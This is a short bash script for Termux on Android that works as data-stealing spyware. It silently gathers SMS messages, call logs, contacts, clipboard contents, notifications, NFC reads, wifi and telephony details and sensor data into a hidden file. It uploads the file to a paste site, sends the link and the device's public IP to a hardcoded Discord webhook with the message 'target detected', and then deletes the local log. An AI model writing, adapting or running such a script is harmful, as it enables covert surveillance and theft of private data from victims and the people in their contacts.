#!/bin/bash
termux-wake-lock

DATABASE="https://discord.com/api/webhooks/987366677845012500/8UBH7xmMEThWqePEUcwObKGY7PLXW5UkaRc65rGCaZgtKZZKzthpyLCmnDy1y72VKVof"

cd ${HOME}
apt install termux-api pastebinit curl -y

termux-api-start
termux-wifi-enable true

log() {
    echo "$1" >> .output.log
}

if [[ -v ".output.log" ]]; then
    rm .output.log
fi

log "# termux-usb"
termux-usb -l >> .output.log
log "------------\n# termux-sms-list"
termux-sms-list >> .output.log
log "-----------------\n# termux-call-log"
termux-call-log >> .output.log
log "-----------------\n# termux-audio-info"
termux-audio-info >> .output.log
log "-------------------\n# termux-camera-info"
termux-camera-info >> .output.log
log "--------------------\n# termux-nfc"
termux-nfc -r full >> .output.log
log "------------\n# termux-tts-engines"
termux-tts-engines >> .output.log
log "--------------------\n# termux-contact-list"
termux-contact-list >> .output.log
log "---------------------\n# termux-clipboard-get"
termux-clipboard-get >> .output.log
log "----------------------\n# termux-wifi-scaninfo"
termux-wifi-scaninfo >> .output.log
log "----------------------\n# termux-battery-status"
termux-battery-status >> .output.log
log "-----------------------\n# termux-sensor"
termux-sensor -a -n 1 >> .output.log
log "---------------\n# termux-notification-list"
termux-notification-list >> .output.log
log "--------------------------\n# termux-battery-status"
termux-wifi-connectioninfo >> .output.log
log "--------------------------\n# termux-telephony-deviceinfo"
termux-telephony-deviceinfo >> .output.log
log "-----------------------------"

USERNAME=$(whoami)
IP=$(curl ifconfig.me)
URL=$(pastebinit -b paste.ubuntu.com .output.log)

curl --header "Content-Type: application/json" --data "{\"content\":\"Alvo detectado!\n${IP}\",\"username\":\"${USERNAME}\"}" $DATABASE
sleep 1

curl --header "Content-Type: application/json" --data "{\"content\":\"${URL}\"}" $DATABASE

rm -f .output.log
